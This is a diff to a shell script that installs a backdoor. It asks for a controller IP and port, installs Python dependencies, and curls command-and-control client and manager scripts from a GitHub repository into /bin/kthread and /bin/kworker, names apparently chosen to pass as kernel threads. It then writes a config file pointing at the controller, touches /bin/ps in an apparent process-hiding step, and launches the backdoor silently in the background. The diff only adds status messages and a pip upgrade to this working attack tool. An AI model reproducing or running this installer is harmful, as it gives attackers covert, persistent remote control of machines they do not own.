@@ -5,13 +5,19 @@ read -p "Enter controller port: " server_port
 echo "Installing backdoor... (this may take a minute)"
 
 # install dependencies
+echo "Installing python3"
 yum install -y -q python3
+echo "Updating pip"
+python3 -m pip install -q --upgrade pip
+echo "Installing cryptography module"
 python3 -m pip install -q cryptography
 
+echo "Downloading backdoor scripts"
 # download backdoor scripts
 curl -s -H 'Cache-Control: no-cache' https://raw.githubusercontent.com/anforsm/command_and_control/main/client.py > /bin/kthread
 curl -s -H 'Cache-Control: no-cache' https://raw.githubusercontent.com/anforsm/command_and_control/main/manager.sh > /bin/kworker
 
+echo "Installing backdoor scripts"
 # create config file
 rm -f /bin/cconf
 echo "SERVER_IP = $server_ip" >> /bin/cconf
@@ -33,3 +39,4 @@ chmod +x /bin/ps
 # start backdoor
 echo "Installation complete. Starting backdoor"
 nohup /bin/kworker > /dev/null 2>&1 &
+echo "Backdoor started"
